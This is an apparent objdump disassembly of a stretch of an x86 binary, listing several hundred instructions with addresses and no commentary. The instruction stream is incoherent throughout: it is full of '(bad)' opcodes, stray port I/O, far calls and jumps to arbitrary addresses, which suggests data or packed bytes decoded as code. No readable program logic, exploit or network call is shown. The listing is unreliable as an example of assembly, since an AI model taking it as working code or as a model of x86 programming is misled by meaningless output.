  41c071:	jbe    0x41c0c8
  41c073:	stc    
  41c074:	loope  0x41c0ef
  41c076:	mov    eax,0x77d6a8e9
  41c07b:	enter  0x3a58,0x1b
  41c07f:	std    
  41c080:	(bad)  
  41c081:	enter  0x5a34,0x39
  41c085:	mov    al,ds:0xa439e8ca
  41c08a:	jb     0x41c07a
  41c08c:	sahf   
  41c08d:	mov    esp,0x8568d435
  41c092:	push   ds
  41c093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c094:	pop    es
  41c095:	test   eax,0xf68d5067
  41c09a:	add    eax,0xedcafd47
  41c09f:	dec    ecx
  41c0a0:	daa    
  41c0a1:	ins    DWORD PTR es:[edi],dx
  41c0a2:	ss inc esp
  41c0a4:	jg     0x41c067
  41c0a6:	ror    DWORD PTR [ebx+0x4d873db7],0xd3
  41c0ad:	dec    ecx
  41c0ae:	add    cl,al
  41c0b0:	sbb    BYTE PTR [esi+0x38],0x9b
  41c0b4:	scas   al,BYTE PTR es:[edi]
  41c0b5:	js     0x41c10d
  41c0b7:	loopne 0x41c0db
  41c0b9:	int    0x94
  41c0bb:	test   BYTE PTR [ecx-0x54460a08],ch
  41c0c1:	add    BYTE PTR [ebp-0x9ed4f56],dl
  41c0c7:	sub    al,0x99
  41c0c9:	jb     0x41c129
  41c0cb:	ror    BYTE PTR [esi],0x19
  41c0ce:	sub    BYTE PTR [esi-0x25610530],cl
  41c0d4:	or     BYTE PTR [esi+0x65e8eed7],ch
  41c0da:	inc    ecx
  41c0db:	mov    dh,0x6
  41c0dd:	sbb    al,0x5e
  41c0df:	or     al,0xd8
  41c0e1:	ret    
  41c0e2:	and    ebp,DWORD PTR [ebx]
  41c0e4:	mov    bh,0x4
  41c0e6:	dec    esi
  41c0e7:	jne    0x41c152
  41c0e9:	pop    esp
  41c0ea:	xor    eax,DWORD PTR [edx+0x27fdb0fb]
  41c0f0:	scas   al,BYTE PTR es:[edi]
  41c0f1:	push   ebx
  41c0f2:	popf   
  41c0f3:	dec    eax
  41c0f4:	mov    cl,0x76
  41c0f6:	je     0x41c0ca
  41c0f8:	xchg   esp,eax
  41c0f9:	out    0xca,eax
  41c0fb:	push   0xfffffff5
  41c0fd:	test   eax,ecx
  41c0ff:	sub    al,0x7f
  41c101:	dec    ebx
  41c102:	scas   al,BYTE PTR es:[edi]
  41c103:	jne    0x41c0c1
  41c105:	outs   dx,BYTE PTR ds:[esi]
  41c106:	shl    BYTE PTR [edi-0x46],1
  41c109:	cs (bad) 
  41c10b:	ja     0x41c129
  41c10d:	push   edi
  41c10e:	out    dx,eax
  41c10f:	cmp    ecx,DWORD PTR [ecx+ebp*4-0x1a]
  41c113:	jle    0x41c129
  41c115:	xchg   ebp,eax
  41c116:	push   ecx
  41c117:	mov    dh,0xd9
  41c119:	(bad)  
  41c11a:	adc    ebx,DWORD PTR [eax-0x3c]
  41c11d:	nop
  41c11e:	jecxz  0x41c183
  41c120:	out    dx,al
  41c121:	lahf   
  41c122:	lahf   
  41c123:	inc    esp
  41c124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c125:	not    BYTE PTR [ebp-0x52]
  41c128:	adc    ch,bh
  41c12a:	push   edx
  41c12b:	inc    esi
  41c12c:	inc    edx
  41c12d:	call   0x5667:0xcad3cd83
  41c134:	jne    0x41c193
  41c136:	jns    0x41c126
  41c138:	pop    ss
  41c139:	pop    ebx
  41c13a:	pmuludq mm5,mm1
  41c13d:	sbb    DWORD PTR [eax-0x595c759],esp
  41c143:	and    eax,DWORD PTR [edx]
  41c145:	test   ebx,edx
  41c147:	sahf   
  41c148:	div    eax
  41c14a:	test   BYTE PTR [edx+0x39870175],ch
  41c150:	jno    0x41c0f6
  41c152:	aad    0x6a
  41c154:	push   esi
  41c155:	xchg   esp,eax
  41c156:	and    BYTE PTR [esi+0x488d794d],dl
  41c15c:	inc    ebp
  41c15d:	sbb    eax,0x75a75dc2
  41c162:	and    cl,dh
  41c164:	into   
  41c165:	imul   BYTE PTR [edx+0x65d3056c]
  41c16b:	mov    ch,0xa1
  41c16d:	cmp    ecx,eax
  41c16f:	push   eax
  41c170:	int3   
  41c171:	or     al,0x75
  41c173:	adc    edx,edi
  41c175:	jne    0x41c173
  41c177:	mov    esi,0xc3908f6d
  41c17c:	push   ebp
  41c17d:	mov    al,ds:0x27ed4a1e
  41c182:	(bad)  
  41c184:	fcom   DWORD PTR [edi-0x73163684]
  41c18a:	cmp    BYTE PTR [edx-0x6242e4bb],0x6c
  41c191:	sbb    eax,0x77
  41c194:	arpl   WORD PTR [esi-0x21],dx
  41c197:	mov    dh,0xad
  41c199:	int    0xa7
  41c19b:	mov    dl,0x59
  41c19d:	fwait
  41c19e:	cmp    eax,0x4c92ce3d
  41c1a3:	jb     0x41c12b
  41c1a5:	cwde   
  41c1a6:	jae    0x41c1c1
  41c1a8:	add    eax,0x87efebbe
  41c1ad:	cmc    
  41c1ae:	mov    al,BYTE PTR [edx+0x467f750c]
  41c1b4:	int3   
  41c1b5:	inc    eax
  41c1b6:	add    al,0x7c
  41c1b8:	lahf   
  41c1b9:	pop    es
  41c1ba:	loop   0x41c160
  41c1bc:	iret   
  41c1bd:	mov    ch,0x97
  41c1bf:	and    al,0x25
  41c1c1:	sbb    ah,BYTE PTR [ebp-0x40]
  41c1c4:	push   ebx
  41c1c5:	xchg   esp,eax
  41c1c6:	mov    al,0x8f
  41c1c8:	mov    esp,es
  41c1ca:	call   0x3e0d:0xb8783c0
  41c1d1:	cmp    cl,dl
  41c1d3:	ror    BYTE PTR [ecx+0x3193add6],0xc
  41c1da:	out    dx,al
  41c1db:	add    al,0x66
  41c1dd:	pop    esp
  41c1de:	test   ebx,0x4efb601f
  41c1e4:	xchg   ebp,eax
  41c1e5:	iret   
  41c1e6:	add    BYTE PTR [ebx],bh
  41c1e8:	popa   
  41c1e9:	clc    
  41c1ea:	push   es
  41c1eb:	or     BYTE PTR [edi+0x67249e8],ah
  41c1f1:	mov    ds:0x386318c5,eax
  41c1f6:	or     cl,BYTE PTR [ebx]
  41c1f8:	xchg   esp,eax
  41c1f9:	mov    eax,0x8df21d20
  41c1fe:	lods   eax,DWORD PTR ds:[esi]
  41c1ff:	mov    al,ds:0xe7599c9
  41c204:	lods   al,BYTE PTR ds:[esi]
  41c205:	push   ebp
  41c206:	out    0x2,eax
  41c208:	mov    BYTE PTR [edx],dh
  41c20a:	fmul   QWORD PTR [ebx-0x1f4c26dc]
  41c210:	sar    BYTE PTR [ecx+0x18253065],1
  41c216:	cwde   
  41c217:	xlat   BYTE PTR ds:[ebx]
  41c218:	cmp    dh,BYTE PTR [edx-0xd]
  41c21b:	pop    ebx
  41c21c:	pop    ebp
  41c21d:	scas   al,BYTE PTR es:[edi]
  41c21e:	jae    0x41c206
  41c220:	push   cs
  41c221:	pop    edi
  41c222:	sbb    al,0xb0
  41c224:	in     eax,0xa2
  41c226:	hlt    
  41c227:	xchg   BYTE PTR [eax],dl
  41c229:	ja     0x41c268
  41c22b:	mov    gs,ecx
  41c22d:	mov    ah,0x8f
  41c22f:	shl    ebx,cl
  41c231:	psubd  mm4,QWORD PTR [ecx+0x65]
  41c235:	js     0x41c1d9
  41c237:	jo     0x41c1f7
  41c239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c23a:	clc    
  41c23b:	jle    0x41c25f
  41c23d:	cmp    BYTE PTR [esi+0x2f],bh
  41c240:	mov    esi,0x53ae89d3
  41c245:	jp     0x41c26a
  41c247:	popf   
  41c248:	mov    dh,0xf6
  41c24a:	scas   al,BYTE PTR es:[edi]
  41c24b:	ss or  DWORD PTR ds:[ebx-0x5],edx
  41c250:	and    DWORD PTR [esi+edi*1-0x1e09d72e],edi
  41c257:	xor    BYTE PTR [esi],bl
  41c259:	inc    edx
  41c25a:	fwait
  41c25b:	scas   eax,DWORD PTR es:[edi]
  41c25c:	inc    ebx
  41c25d:	dec    ebx
  41c25e:	lods   al,BYTE PTR ds:[esi]
  41c25f:	sub    edx,esp
  41c261:	cmp    DWORD PTR ds:0xe0d26263,ebx
  41c267:	push   0xffffffb6
  41c269:	pop    eax
  41c26a:	adc    ecx,DWORD PTR [ecx+0x1aad0070]
  41c270:	cmp    ch,BYTE PTR [ebx-0x6b]
  41c273:	retf   
  41c274:	das    
  41c275:	das    
  41c276:	xchg   DWORD PTR [eax],esi
  41c278:	adc    BYTE PTR [ebx],bl
  41c27a:	jbe    0x41c216
  41c27c:	repz out 0x6f,eax
  41c27f:	(bad)  
  41c281:	push   ebp
  41c282:	xchg   edi,eax
  41c283:	sub    esp,ebp
  41c285:	iret   
  41c286:	fild   WORD PTR [eax+0x79]
  41c289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c28a:	sub    al,0x7a
  41c28c:	popf   
  41c28d:	in     eax,dx
  41c28e:	push   es
  41c28f:	mov    eax,ds:0x965cf8d9
  41c294:	jae    0x41c263
  41c296:	mov    eax,ds:0x9851c9a9
  41c29b:	xchg   esi,eax
  41c29c:	cmp    dh,cl
  41c29e:	xor    bh,ah
  41c2a0:	sti    
  41c2a1:	ficom  WORD PTR [edi-0xb7cecbb]
  41c2a7:	test   dl,ch
  41c2a9:	idiv   BYTE PTR [ebx]
  41c2ab:	shr    BYTE PTR [edx-0x24],1
  41c2ae:	mov    ah,0x8b
  41c2b0:	xor    al,0xd
  41c2b2:	jecxz  0x41c2de
  41c2b4:	mov    ss,WORD PTR [edi]
  41c2b6:	stos   BYTE PTR es:[edi],al
  41c2b7:	out    0x8a,al
  41c2b9:	shl    DWORD PTR [edx],cl
  41c2bb:	mov    ss,WORD PTR [ebp-0x61017885]
  41c2c1:	xchg   edx,eax
  41c2c2:	outs   dx,DWORD PTR ds:[esi]
  41c2c3:	adc    eax,DWORD PTR [eax]
  41c2c5:	and    ebp,DWORD PTR [esi]
  41c2c7:	xchg   BYTE PTR ds:0xa3795260,dh
  41c2cd:	or     esp,edi
  41c2cf:	out    dx,eax
  41c2d0:	jnp    0x41c2aa
  41c2d2:	pop    edx
  41c2d3:	mov    DWORD PTR [esi-0x12],edi
  41c2d6:	es adc al,0x9
  41c2d9:	pop    esp
  41c2da:	dec    eax
  41c2db:	xchg   BYTE PTR [eax],bl
  41c2dd:	imul   esp,eax,0xa90af04c
  41c2e3:	mov    al,0xb6
  41c2e5:	out    0x76,al
  41c2e7:	jp     0x41c2d1
  41c2e9:	adc    eax,edi
  41c2eb:	mov    edx,ebx
  41c2ed:	jo     0x41c273
  41c2ef:	push   cs
  41c2f0:	mov    ecx,0x92f4c42e
  41c2f5:	adc    al,0xe0
  41c2f7:	push   ecx
  41c2f8:	jo     0x41c2e3
  41c2fa:	sub    DWORD PTR [edi*4-0x1e947cca],ebp
  41c301:	(bad)  
  41c302:	rol    BYTE PTR [edi+0x4262bc90],0xee
  41c309:	pop    ebp
  41c30a:	repz daa 
  41c30c:	add    ebp,DWORD PTR [ebx+0x7cc8f50d]
  41c312:	and    eax,0x9033ec61
  41c317:	inc    ebp
  41c318:	ds int3 
  41c31a:	mov    ecx,0xeb240064
  41c31f:	sbb    al,0xbe
  41c321:	inc    edx
  41c322:	push   ss
  41c323:	in     al,0x90
  41c325:	pop    esp
  41c326:	or     dl,BYTE PTR [ebx]
  41c328:	(bad)  [edi+ebx*8]
  41c32b:	cmp    ebx,DWORD PTR [eax+edi*2+0x41]
  41c32f:	xchg   esp,eax
  41c330:	add    DWORD PTR [edx-0x28bf394e],ebp
  41c336:	cmc    
  41c337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c338:	sbb    DWORD PTR [eax+eax*1+0x5c],eax
  41c33c:	dec    eax
  41c33d:	outs   dx,BYTE PTR ds:[esi]
  41c33e:	mov    ch,0x4
  41c340:	sbb    DWORD PTR ds:0x88c8819b,ebx
  41c346:	and    al,0x20
  41c348:	and    BYTE PTR [ecx+0x67f20451],dl
  41c34e:	int3   
  41c34f:	pushf  
  41c350:	inc    esp
  41c351:	jmp    0x94949c40
  41c356:	inc    edx
  41c357:	dec    ecx
  41c358:	inc    esi
  41c359:	ret    
  41c35a:	int3   
  41c35b:	(bad)  
  41c35c:	xchg   esp,eax
  41c35d:	stos   BYTE PTR es:[edi],al
  41c35e:	xor    eax,0x95c9f691
  41c363:	pop    edi
  41c364:	mov    ds:0x23708b41,eax
  41c369:	xchg   edi,eax
  41c36a:	add    al,0x80
  41c36c:	imul   esi,DWORD PTR ds:0xd99847c3,0x8e04c5f4
  41c376:	xchg   edi,eax
  41c377:	in     eax,0xa
  41c379:	das    
  41c37a:	push   esp
  41c37b:	outs   dx,BYTE PTR ds:[esi]
  41c37c:	push   edi
  41c37d:	jno    0x41c3eb
  41c37f:	mov    ds:0x54da4254,eax
  41c384:	shl    edx,cl
  41c386:	ret    0x2507
  41c389:	add    dh,cl
  41c38b:	xchg   edi,eax
  41c38c:	mov    esi,0xcd9a2f19
  41c391:	dec    esp
  41c392:	mov    ebp,DWORD PTR [eax-0x30]
  41c395:	daa    
  41c396:	push   cs
  41c397:	sbb    edi,DWORD PTR [ebp+0x62002815]
  41c39d:	mov    eax,ds:0x49a271b6
  41c3a2:	xchg   BYTE PTR [eax],cl
  41c3a4:	cs add eax,0x5371f970
  41c3aa:	cmp    DWORD PTR [edx+0x729e418f],esi
  41c3b0:	popa   
  41c3b1:	pop    ss
  41c3b2:	aad    0x28
  41c3b4:	int3   
  41c3b5:	mov    ds:0x6c8bba3b,al
  41c3ba:	shr    DWORD PTR [ecx],cl
  41c3bc:	jbe    0x41c3a3
  41c3be:	stc    
  41c3bf:	sbb    DWORD PTR [esi-0x79],0xffffffae
  41c3c3:	mov    ds:0x1e70c036,al
  41c3c8:	add    ebx,DWORD PTR [esi-0x69257b92]
  41c3ce:	adc    al,0x70
  41c3d0:	out    0xcf,al
  41c3d2:	jge    0x41c3a0
  41c3d4:	cwde   
  41c3d5:	in     al,dx
  41c3d6:	or     BYTE PTR [edi-0x3a],dh
  41c3d9:	xlat   BYTE PTR ds:[ebx]
  41c3da:	inc    ebp
  41c3db:	mov    ah,0x9c
  41c3dd:	jno    0x41c417
  41c3df:	shl    edx,1
  41c3e1:	sub    eax,0x2445bb07
  41c3e6:	fwait
  41c3e7:	adc    ebx,edi
  41c3e9:	jl     0x41c37c
  41c3eb:	mov    al,ds:0x852125d0
  41c3f0:	mul    DWORD PTR [ebp+0x40336164]
  41c3f6:	add    al,0x3a
  41c3f8:	jp     0x41c3ff
  41c3fa:	pop    es
  41c3fb:	mov    ecx,0xef86a671
  41c400:	mov    al,0x29
  41c402:	cmc    
  41c403:	cwde   
  41c404:	not    BYTE PTR [eax+edi*2]
  41c407:	inc    eax
  41c408:	dec    ecx
  41c409:	not    ecx
  41c40b:	sbb    al,BYTE PTR [edi-0x7]
  41c40e:	in     eax,0xd
  41c410:	xchg   edx,eax
  41c411:	or     dl,ah
  41c413:	repnz mov ecx,0x91d16fc4
  41c419:	jnp    0x41c3a4
  41c41b:	jmp    0x41c437
  41c41d:	cmp    DWORD PTR [esi-0x20],edx
  41c420:	pop    ss
  41c421:	daa    
  41c422:	or     BYTE PTR [ecx],dh
  41c424:	jae    0x41c483
  41c426:	das    
  41c427:	dec    ebp
  41c428:	pop    edi
  41c429:	data16 (bad) 
  41c42b:	sbb    esi,0x572b9004
  41c431:	xchg   ebp,eax
  41c432:	mov    BYTE PTR [edx],0x0
  41c435:	mov    ds:0x79ca3968,al
  41c43a:	rcl    DWORD PTR [edx-0x2a528749],cl
  41c440:	push   cs
  41c441:	into   
  41c442:	scas   eax,DWORD PTR es:[edi]
  41c443:	mov    bl,BYTE PTR [ecx+0x4addd2e7]
  41c449:	pop    es
  41c44a:	lock mov al,0xc3
  41c44d:	mov    ebp,0xa5f02c7
  41c452:	data16 clc 
  41c454:	test   BYTE PTR [ebx-0x370840b8],0xe3
  41c45b:	xchg   ecx,eax
  41c45c:	aam    0xc9
  41c45e:	or     al,BYTE PTR [ebx-0x18]
  41c461:	pop    esi
  41c462:	outs   dx,BYTE PTR ds:[esi]
  41c463:	push   edx
  41c464:	mov    bl,0x88
  41c466:	(bad)  
  41c468:	push   es
  41c469:	mov    esi,0xc9f021f7
  41c46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c46f:	into   
  41c470:	ins    DWORD PTR es:[edi],dx
  41c471:	shr    DWORD PTR [edi],1
  41c473:	fld    TBYTE PTR [edi]
  41c475:	jne    0x41c4f4
  41c477:	loope  0x41c4a5
  41c479:	mov    esp,0xb161214
  41c47e:	shl    DWORD PTR [eax-0x12],cl
  41c481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c482:	fidiv  WORD PTR [ecx]
  41c484:	push   ds
  41c485:	or     BYTE PTR [ebx+0x74],bl
  41c488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c489:	jmp    0x99326ea1
  41c48e:	adc    DWORD PTR [edx],ebp
  41c490:	fsubr  DWORD PTR [edx]
  41c492:	and    esp,DWORD PTR [esp+edx*2]
  41c495:	fsubp  st(6),st
  41c497:	mov    BYTE PTR [esi+0x27],bh
  41c49a:	mov    ecx,0x7a89f538
  41c49f:	jecxz  0x41c4a1
  41c4a1:	push   edx
  41c4a2:	pop    esi
  41c4a3:	ret    0x5d9d
  41c4a6:	in     eax,0xf4
  41c4a8:	mov    esi,0xaea871f7
  41c4ad:	fs xchg edx,eax
  41c4af:	push   ecx
  41c4b0:	and    BYTE PTR [edx-0x1c22aa04],dh
  41c4b6:	enter  0x7d40,0x3d
  41c4ba:	pop    ds
  41c4bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4bc:	int    0xc6
  41c4be:	xchg   BYTE PTR [edi-0x3d],al
  41c4c1:	adc    DWORD PTR ds:0xb9468df8,ebx
  41c4c7:	retf   0x7d25
  41c4ca:	loop   0x41c509
  41c4cc:	inc    ecx
  41c4cd:	in     al,0x8e
  41c4cf:	xchg   edi,eax
  41c4d0:	sar    DWORD PTR [edi-0x4c2aab78],1
  41c4d6:	ficomp WORD PTR [eax]
  41c4d8:	sub    DWORD PTR [ecx-0x1f],ebp
  41c4db:	idiv   ebp
  41c4dd:	mov    dl,0xd7
  41c4df:	ins    DWORD PTR es:[edi],dx
  41c4e0:	stc    
  41c4e1:	shl    BYTE PTR [ebp-0x2b2fd197],cl
  41c4e7:	jo     0x41c542
  41c4e9:	frstor gs:[edx-0x5f843883]
  41c4f0:	bound  edx,QWORD PTR ds:0xb18e23ee
  41c4f6:	xchg   ebx,edi
  41c4f8:	ficom  DWORD PTR [ebx-0x7d]
  41c4fb:	and    eax,DWORD PTR [esi-0x2d9a2d1b]
  41c501:	nop
  41c502:	push   ecx
  41c503:	pop    es
  41c504:	das    
  41c505:	mov    ds,edi
  41c507:	sbb    al,BYTE PTR [edx+edx*2+0x18]
  41c50b:	jecxz  0x41c581
  41c50d:	sub    eax,0xe675c2c1
  41c512:	scas   eax,DWORD PTR es:[edi]
  41c513:	popf   
  41c514:	xor    al,0x47
  41c516:	push   ds
  41c517:	imul   ebp,DWORD PTR [edi],0x4bda36cb
  41c51d:	mov    esi,0xffb12cf2
  41c522:	outs   dx,BYTE PTR ds:[esi]
  41c523:	xor    ebx,eax
  41c525:	inc    esi
  41c526:	ds dec eax
  41c528:	lahf   
  41c529:	cli    
  41c52a:	mov    bh,0xcc
  41c52c:	stc    
  41c52d:	jge    0x41c5a8
  41c52f:	sub    ch,BYTE PTR [eax]
  41c531:	xor    ecx,DWORD PTR [ebx+0x44]
  41c534:	push   0x2932810a
  41c539:	and    BYTE PTR [ebx-0x552b3e33],0x97
  41c540:	mov    ch,0xe4
  41c542:	jnp    0x41c4d2
  41c544:	icebp  
  41c545:	out    0x92,eax
  41c547:	xor    BYTE PTR [edx-0x30],dh
  41c54a:	mov    al,ds:0x4a1fbff6
  41c54f:	sbb    BYTE PTR es:[edi],ah
  41c552:	clc    
  41c553:	mov    esp,0x11195418
  41c558:	lods   eax,DWORD PTR ds:[esi]
  41c559:	pop    ds
  41c55a:	rol    BYTE PTR [ebx+0x21],1
  41c55d:	shl    DWORD PTR [ebp+0x66858cca],0x1e
  41c564:	nop
  41c565:	and    al,BYTE PTR [ecx]
  41c567:	arpl   ax,cx
  41c569:	cmp    eax,0x35e23260
  41c56e:	jo     0x41c582
  41c570:	clc    
  41c571:	inc    edi
  41c572:	loop   0x41c50a
  41c574:	stos   DWORD PTR es:[edi],eax
  41c575:	stos   BYTE PTR es:[edi],al
  41c576:	push   edi
  41c577:	in     eax,0x60
  41c579:	fbld   TBYTE PTR [ebp-0x34f6036]
  41c57f:	ret    0x4690
  41c582:	cmc    
  41c583:	add    al,0x50
  41c585:	call   0xd14b:0x929719b1
  41c58c:	inc    esp
  41c58d:	xlat   BYTE PTR ds:[ebx]
  41c58e:	add    edi,DWORD PTR [ecx+0x58167833]
  41c594:	xchg   ebp,eax
  41c595:	out    dx,al
  41c596:	ror    eax,0xa8
  41c599:	imul   edi,DWORD PTR [edx-0x3],0xffffffaf
  41c59d:	xchg   esp,eax
  41c59e:	and    eax,0xdec62bd4
  41c5a3:	fdivrp st(0),st
  41c5a5:	mov    ds:0x27d01f5d,eax
  41c5aa:	push   0x764a6d5
  41c5af:	out    dx,eax
  41c5b0:	push   edx
  41c5b1:	add    BYTE PTR [esi-0x63],bh
  41c5b4:	pushf  
  41c5b5:	inc    esi
  41c5b6:	mov    DWORD PTR [edi],0x260c2150
  41c5bc:	ror    BYTE PTR [esi-0x66fc3de8],cl
  41c5c2:	adc    al,0xd
  41c5c4:	icebp  
  41c5c5:	js     0x41c633
  41c5c7:	loopne 0x41c632
  41c5c9:	adc    eax,0x7a3d821a
  41c5ce:	jae    0x41c5e1
  41c5d0:	dec    edx
  41c5d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5d2:	and    ebx,edi
  41c5d4:	arpl   WORD PTR [ecx-0x6200a3e1],dx
  41c5da:	push   cs
  41c5db:	lds    edx,FWORD PTR [ebx+0x7d7ea350]
  41c5e1:	lods   al,BYTE PTR ds:[esi]
  41c5e2:	push   edx
  41c5e3:	sbb    ebx,esp
  41c5e5:	sbb    ebp,DWORD PTR [edi+eax*1+0xf6a2e93]
  41c5ec:	gs cmp al,0xce
  41c5ef:	pop    ss
  41c5f0:	xor    ch,BYTE PTR [ebp-0x58]
  41c5f3:	xchg   BYTE PTR [edx],ch
  41c5f5:	or     dl,BYTE PTR [edx-0x60a91211]
  41c5fb:	clc    
  41c5fc:	sub    eax,0x16d3d3e7
  41c601:	sbb    al,0x79
  41c603:	ins    DWORD PTR es:[edi],dx
  41c604:	sbb    eax,0xfec39833
  41c609:	mov    dl,0x5a
  41c60b:	sub    al,0x77
  41c60d:	jecxz  0x41c64d
  41c60f:	pop    esp
  41c610:	cld    
  41c611:	mov    ds:0x3fcbd563,eax
  41c616:	mov    ds:0x7efa1805,al
  41c61b:	add    eax,0x69cd02db
  41c620:	pop    es
  41c621:	pop    eax
  41c622:	jmp    0x8d84:0x2c8353f5
  41c629:	cmp    edx,0x52
  41c62c:	shl    DWORD PTR [edx-0x1f],1
  41c62f:	xchg   esp,eax
  41c630:	enter  0x4e0a,0x5f
  41c634:	xchg   edx,eax
  41c635:	stos   DWORD PTR es:[edi],eax
  41c636:	stos   DWORD PTR es:[edi],eax
  41c637:	xlat   BYTE PTR ds:[ebx]
  41c638:	cmp    eax,ecx
  41c63a:	fnsave cs:[edi]
  41c63d:	or     al,0xb
  41c63f:	xor    bh,ah
  41c641:	sbb    al,0x9f
  41c643:	pop    DWORD PTR [ecx+0x22439752]
  41c649:	in     al,0xd
  41c64b:	push   0x70ddb78c
  41c650:	mov    al,fs:0xbe04f57a
  41c656:	ja     0x41c60b
  41c658:	in     al,0xb4
  41c65a:	lods   eax,DWORD PTR ds:[esi]
  41c65b:	add    eax,0xe6571de8
  41c660:	pop    ecx
  41c661:	(bad)  
  41c662:	pushf  
  41c663:	jo     0x41c6b8
  41c665:	sbb    edi,DWORD PTR ds:0xc741509d
  41c66b:	mov    esi,0x3f06bdda
  41c670:	aas    
  41c671:	hlt    
  41c672:	cmp    BYTE PTR [esi],cl
  41c674:	sbb    DWORD PTR [ecx+0x61327fd5],edi
  41c67a:	in     al,dx
  41c67b:	mov    fs,WORD PTR [edx]
  41c67d:	fistp  DWORD PTR [eax]
  41c67f:	sub    bh,0x49
  41c682:	in     al,dx
  41c683:	das    
  41c684:	ds stc 
  41c686:	fcom   QWORD PTR [eax]
  41c688:	shr    eax,cl
  41c68a:	mov    dh,0x21
  41c68c:	add    dl,BYTE PTR [ebx-0x36539ea9]
  41c692:	sub    DWORD PTR [ebp+ecx*1-0x520a1ce4],eax
  41c699:	or     edx,DWORD PTR [ebp+0x6c708b90]
  41c69f:	jmp    0x9a1ae4c4
  41c6a4:	repnz retf 0x238a
  41c6a8:	(bad)  
  41c6a9:	fdiv   QWORD PTR [ebp+0x71]
  41c6ac:	add    al,0x41
  41c6ae:	inc    ebx
  41c6af:	mov    ds:0x768c682a,eax
  41c6b4:	arpl   si,bx
  41c6b6:	retf   0x661b
  41c6b9:	inc    ebp
  41c6ba:	sbb    edi,esi
  41c6bc:	sbb    al,dh
  41c6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6bf:	inc    ebp
  41c6c0:	xor    al,0x6d
  41c6c2:	adc    DWORD PTR [edx],edi
  41c6c4:	loope  0x41c67f
  41c6c6:	in     al,dx
  41c6c7:	mov    cl,BYTE PTR [eax-0xd]
  41c6ca:	int    0xb5
  41c6cc:	jge    0x41c6d1
  41c6ce:	test   al,0x86
  41c6d0:	(bad)  
  41c6d1:	push   0xf86086ae
  41c6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6d7:	inc    edi
  41c6d8:	adc    eax,0x13dbb5ff
  41c6dd:	sub    dl,BYTE PTR [eax+0x14b370c]
  41c6e3:	xor    al,0x47
  41c6e5:	ins    DWORD PTR es:[edi],dx
  41c6e6:	cmp    edi,DWORD PTR [esi-0x4d]
  41c6e9:	jl     0x41c679
  41c6eb:	loopne 0x41c756
  41c6ed:	imul   ecx,DWORD PTR [eax-0x16179a3e],0xaaa87b3a
  41c6f7:	fcmovne st,st(4)
  41c6f9:	ret    0xb857
  41c6fc:	imul   BYTE PTR [ebx+0x158e65cc]
  41c702:	xor    esp,esp
  41c704:	fwait
  41c705:	into   
  41c706:	inc    esp
  41c707:	mov    edx,0xc7a68fa5
  41c70c:	loopne 0x41c783
  41c70e:	jle    0x41c77b
  41c710:	lock or esp,DWORD PTR [edi]
  41c713:	mov    edx,ecx
  41c715:	js     0x41c739
  41c717:	ret    
  41c718:	call   0xb00fe1a2
  41c71d:	add    DWORD PTR [eax-0x63],esi
  41c720:	mov    ds:0xf759cb2,al
  41c725:	dec    ebp
  41c726:	push   cs
  41c727:	ror    DWORD PTR [esi-0x411634b0],cl
  41c72d:	push   edx
  41c72e:	out    0x77,eax
  41c730:	fst    QWORD PTR [ebp+0x36]
  41c733:	iret   
  41c734:	enter  0xcc06,0x4a
  41c738:	xchg   esi,eax
  41c739:	repz xlat BYTE PTR ds:[ebx]
  41c73b:	xor    DWORD PTR [edi+eax*8+0x7a],esp
  41c73f:	push   eax
  41c740:	pop    ebx
  41c741:	xor    bl,BYTE PTR [ebx]
  41c743:	(bad)  
  41c744:	adc    dl,BYTE PTR [edi+0x55]
  41c747:	sub    BYTE PTR [ebp-0x1a],0x77
  41c74b:	cld    
  41c74c:	mov    eax,ds:0x9acd30eb
  41c751:	div    BYTE PTR [eax-0x363e4562]
  41c757:	mov    dl,0xcd
  41c759:	cdq    
  41c75a:	daa    
  41c75b:	fld    DWORD PTR ds:0x4494a0d0
  41c761:	mov    edi,0x72b4a0c1
  41c766:	stos   DWORD PTR es:[edi],eax
  41c767:	mov    ds:0x3bed309,eax
  41c76c:	inc    ebp
  41c76d:	fs xchg esp,eax
  41c76f:	push   ss
  41c770:	push   0xc1f108be
  41c775:	dec    esp
  41c776:	lock add bl,BYTE PTR [esi-0x8c76d86]
  41c77d:	test   eax,0x6a729df4
  41c782:	popf   
  41c783:	xor    al,0x9c
  41c785:	inc    ebx
  41c786:	jno    0x41c7e1
  41c788:	mov    BYTE PTR [esi],ch
  41c78a:	out    dx,al
  41c78b:	(bad)
  41c78e:	retf   0x32d4
  41c791:	arpl   sp,di
  41c793:	dec    ebp
  41c794:	push   eax
  41c795:	jnp    0x41c7a1
  41c797:	sbb    bh,ch
  41c799:	ja     0x41c7b8
  41c79b:	push   ds
  41c79c:	inc    edi
  41c79d:	dec    DWORD PTR [ecx-0x7fbefbaa]
  41c7a3:	js     0x41c769
  41c7a5:	ja     0x41c788
  41c7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7a8:	in     al,dx
  41c7a9:	arpl   WORD PTR [edi-0x50],bx
  41c7ac:	cli    
  41c7ad:	ss in  eax,dx
  41c7af:	mov    ds:0xd030dd47,al
  41c7b4:	jp     0x41c7ea
  41c7b6:	mov    dh,0x1c
  41c7b8:	jg     0x41c7d0
  41c7ba:	mov    esp,0x1496acfe
  41c7bf:	loop   0x41c794
  41c7c1:	imul   eax,DWORD PTR [eax+0x25],0x40f48960
  41c7c8:	rcl    cl,cl
  41c7ca:	test   BYTE PTR [edi+0x3dfdb0bf],ah
  41c7d0:	ss jnp 0x41c832
  41c7d3:	push   eax
  41c7d4:	psrlq  mm0,QWORD PTR [ecx]
  41c7d7:	imul   edx,DWORD PTR [eax+0x6cb170af],0x5994e2fc
  41c7e1:	(bad)  
  41c7e2:	inc    edx
  41c7e3:	cmp    DWORD PTR ds:0x36edff7c,ebp
